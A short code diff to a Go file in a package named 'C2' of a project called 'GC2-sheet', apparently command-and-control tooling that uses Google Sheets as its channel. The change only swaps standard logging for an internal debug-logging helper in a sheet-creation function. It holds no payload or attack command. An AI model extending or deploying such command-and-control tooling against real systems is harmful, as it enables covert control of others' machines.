@@ -2,8 +2,8 @@ package C2
 
 import (
 	"GC2-sheet/internal/configuration"
+	"GC2-sheet/internal/utils"
 	"google.golang.org/api/sheets/v4"
-	"log"
 )
 
 func createSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet)  {
@@ -25,7 +25,7 @@ func createSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet)
 	_, err1 := client.Spreadsheets.BatchUpdate(spreadSheet.SpreadSheetId, batchupDateSpreadSheetRequest).Do()
 
 	if err1 != nil {
-		log.Fatal("Error creating new sheet: " + err1.Error())
+		utils.LogFatalDebug("Error creating new sheet: " + err1.Error())
 	}
 
 }
